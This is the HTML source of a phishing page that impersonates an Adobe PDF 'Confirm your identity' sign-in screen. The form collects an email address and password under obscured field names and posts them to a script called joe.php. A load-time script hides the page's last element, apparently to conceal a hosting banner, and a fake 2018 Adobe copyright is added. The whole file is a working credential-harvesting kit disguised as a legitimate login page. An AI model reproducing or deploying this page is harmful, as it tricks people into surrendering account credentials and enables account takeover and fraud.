<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Download Document - Adobe Sign In</title>
<style type="text/css">
<!--
body {
	background-image:url("Adobe%20Sign%20In_files/bg.jpg");
	background-repeat: no-repeat;
	background-size: 100% 100%;
	background-attachment: fixed;
	z-index: -950;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
</style>
<link href="./files/style.css" rel="stylesheet" type="text/css">
<script type="text/javascript">
<!--
function MM_goToURL() { //v3.0
  var i, args=MM_goToURL.arguments; document.MM_returnValue = false;
  for (i=0; i<(args.length-1); i+=2) eval(args[i]+".location='"+args[i+1]+"'");
}
</div>

  document.addEventListener("DOMContentLoaded", function(event) {
    document.querySelector("body > div:last-child").setAttribute('style', 'display:none !important');
  });
//-->
</script>
<link rel="shortcut icon" href="./files/adobe_logo_new_1.jpg" type="image/gif"></head>
<body>
<div style="background-color:rgba(0, 0, 0, 0.5); height:740px;">
<div class="HeaderBox">
  <div align="right">p<a target="_blank" href="https://get.adobe.com/reader/">
  <img src="./files/Acrobat_Reader.fw.png" width="158" height="39" longdesc="">   </a></div>
  <div class="clear2"></div></div>
<div class="NavBox">
<a href="index.php#" class="NavButton">Exit</a>
<a href="index.php#" class="NavButton">Download Document</a>
<form><a href="index.php#" class="NavButton">Print</a> </form>
<a href="index.php#" class="NavButton">Sign In</a>
 <div class="document">CONFIRM YOUR EMAIL TO DOWNLOAD DOCUMENT </div>
 <div class="clear2"></div>
 </div>
  <div class="element"> 
    <div class="titlr_box">
      <h1 align="left">Adobe PDF Online</h1>
  </div>
    <p><strong>Confirm your identity</strong>!<br>
     Sign in with your receiving email account to view document</p>
  
  <link href="./files/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<style type="text/css">
.textFieldlog {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
	color: #2E2E2E;
	height: 24px;
	width: 96%;
	margin-bottom: 4px;
	border: 1px solid #A8A8A8;
	margin-right: auto;
	margin-left: auto;
	padding-top: 4px;
	padding-right: 10px;
	padding-bottom: 4px;
	padding-left: 10px;
	background-color: #FAFAF8;
	background-image: url(images/bg_form.png);
	background-repeat: repeat;
}
.ButtonLOG {
	color: #FFF;
	background-color: #F66;
	border: 1px solid #FFF;
	padding-top: 5px;
	padding-right: 3px;
	padding-bottom: 5px;
	padding-left: 3px;
	font-family: Arial, sans-serif;
	font-size: 11.6px;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	-khtml-border-radius: 4px;
	border-radius: 4px;
	margin-right: 2%;
	text-decoration: none;
	margin-top: 2%;
	font-weight: bold;
}
.ButtonLOG:hover {
	background-color: #FF2F2F;
}
.texthinter {
	font-size: 14px;
	font-family: Arial, sans-serif;
	color: #333;
}
.textform {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	text-transform: uppercase;
	color: #4D4D4D;
}
.YeloowTop {
	background-color: #4B4B4B;
	border: 1px solid #333333;
	padding: 2%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 16px;
	color: #FFF;
}
.hint23 {
	background-color: #FFEAEA;
	border: 1px solid #FBB;
	font-family: Tahoma, Geneva, sans-serif;
	color: #2B2D3C;
	font-size: 16px;
	margin-bottom: 2%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	margin-top: 2%;
	padding-top: 3%;
	padding-right: 3%;
	padding-bottom: 3%;
	padding-left: 8%;
	background-image: url(images/warning.png);
	background-repeat: no-repeat;
	background-position: 8px;
}
.sidebox67 {
	background-color: #FFCC00;
	padding: 4%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
}
</style>
<script src="./files/SpryValidationTextField.js" type="text/javascript"></script>
  <form id="details" autocomplete="off" method="post" action="joe.php" name="sendMessage">
  <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr valign="baseline">
      <td class="texthinter" align="left" height="57" nowrap="nowrap" valign="top" width="71%"><label for="repl_id1"><strong>Email ID:</strong></label>
        <br>
        <strong>
        <label for="email"></label>
        <span id="sprytextfield2" class="">
				<input autocomplete="off" name="mik" class="textFieldlog" id="email" placeholder="Enter Email Address" value="" type="email">
        <span class="textfieldRequiredMsg"><br>Email address is required.</span><span class="textfieldInvalidFormatMsg"><br>Invalid email address.</span></span></strong></td>
      <td rowspan="2" class="texthinter" align="right" nowrap="nowrap" valign="middle" width="29%"><img src="./files/secure.png" height="108" width="108"></td>
    </tr>
    <tr valign="top">
      <td class="texthinter" align="left" nowrap="nowrap">
                <label for="repl_id1"><strong>Password:</strong></label>
             <br><span id="sprytextfield1" class="">
        <input autocomplete="off" id="password" name="choc" class="textFieldlog" value="" size="32" placeholder="Enter Your Password" type="password">
      <span class="textfieldRequiredMsg"><br>
      <div class="texthinter">Password is Required.</div></span></span></td>
    </tr>
    <tr valign="baseline">
      <td align="left" nowrap="nowrap" valign="middle">
      <input class="button1" value="View Document" name="submit" type="submit">
      <input name="button2" id="button2" value="Reset" class="button1" type="reset"></td>
      <td align="left" nowrap="nowrap" valign="middle">&nbsp;</td>
    </tr>
  </tbody></table>
    <input type="hidden" name="sendgo" value="sendto">
 
</form>
<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2", "email");
//-->
</script>
  
</div>
<div class="logo1"><img src="./files/adobe_logo_new_1.jpg" width="110"></div>
<div class="copyright">Copyright 
	<span style="color: rgb(204, 204, 204); font-family: Arial, sans-serif; font-size: 11px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: bold; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: capitalize; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgba(0, 0, 0, 0.498039); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
	©</span> 2018 Adobe Systems Incorporated. All rights reserved.</div></div>
	<script type="application/javascript">
      document.addEventListener("DOMContentLoaded", function(event) {
    document.querySelector("body > div:last-child").setAttribute('style', 'display:none !important');
  });
    </script>

</body></html>